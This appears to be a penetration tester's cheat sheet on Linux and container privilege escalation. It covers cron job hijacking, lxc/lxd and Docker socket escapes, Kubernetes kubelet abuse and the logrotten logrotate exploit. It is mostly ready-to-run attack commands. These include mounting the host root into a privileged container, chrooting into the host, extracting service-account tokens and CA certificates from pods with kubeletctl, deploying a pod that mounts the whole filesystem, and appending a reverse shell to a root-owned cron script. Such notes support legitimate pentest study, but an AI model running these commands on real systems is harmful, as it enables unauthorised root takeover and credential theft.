* Cron Job abuse:
	* Check for Cron jobs using `crontab` command, `cat /etc/crontab`, `ls -lah /etc/cron*` files
	* Check for running Cron jobs using log files: `cat /var/log/cron.log` or `grep "CRON" /var/log/syslog`
	* Find a cronjob script file that is owned by and executed frequently by a high privileged  user and check if the file permissions allow the current user to modify it.
	* Try locating files, directory that the cronjob interacts with.
	* Use `pspy` to observed all commandlines, file system actions.
	* As example add an one liner reverse shell at the end of the script for a high level user shell
 * Lxc/Lxd container:
	 * If user in lxc/lxd group follow [[Privileged groups]] for privilege escalation.
 * Docker container: 
	 * Method 1:
		 * If user in docker group follow [[Privileged groups]] for privilege escalation.
	 * Method 2:
		 * Docker shared directories between a host and a docker container can expose sensitive files that can be access from within the container that could not be accessed from host.
	* Method 3:
		 * Docker socket exposed within the container. Usually located in `/var/run/docker.sock`.
		 * Allows to use docker commands to the docker socket. If needed upload docker binary from kali.
		* Create a privileged docker container: `docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem <image>`
		* List docker containers: `docker -H unix:///app/docker.sock ps`
		* Login into the docker: `docker -H unix:///app/docker.sock exec -it <container id> /bin/bash`
		* Search for loot.
	* Method 4:
		* If Docker socket is writable.
		* Run container and map `/` to `/mnt` for container : `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <image> chroot /mnt bash`
* Kubernetes:
	* Control plane components (service: ports):
		* `etcd: 2379,2380`;`API server: 6443`; `Scheduler: 10251`;`Controller Manager: 10252`; `Kubelet API: 10250`;|`Read-Only Kubelet API: 10255`
	* Interacting with the API server: `curl https://<ip>:6443 -k`
	* Extracting pods using curl with Kubelet API: `curl https://<ip>:10250/pods -k | jq .`
	* Extracting pods using kubeletctl: `kubeletctl -i --server <ip> pods`
	* Commands using kubeletctl:
		* Command execution on pod: `kubeletctl -i --server <ip> exec "<command>" -p <pod> -c <container>`
		* More commands from kubelectcl: https://github.com/cyberark/kubeletctl
	* Privilege escalation:
		* Token extraction: `kubeletctl -i --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container> | tee -a k8.token`
		* Certificate extraction: `kubeletctl --server <ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod> -c <container> | tee -a ca.crt`
		* List privilege: `kubectl --token=<token> --certificate-authority=ca.crt --server=https:/<ip>:6443 auth can-i --list`
		* Use YAML file to to create container and mount the entire file system into the container: [[Kubernetes Pod YAML]]
			* Pod creation: `kubectl --token=<token> --certificate-authority=ca.crt --server=https://<ip>:6443 apply -f privesc.yaml`
			* Use `kubeletctl` exec command to explore filesystem.
* Logrotate:
	* Check logrotate version which can likely be vulnerable to race condition to arbitrary file write when a log file is changed for renaming which causes logrotate to trigger. This exploit is [logrotten](https://github.com/whotwagner/logrotten) 
		* Preconditions:
			*  Logrotate has to be executed as root.
			- The logpath needs to be in control of the attacker.
			- Any option that creates files is set in the logrotate configuration.
	* Transfer and execute logrotten which will check for log renaming and execute command as root.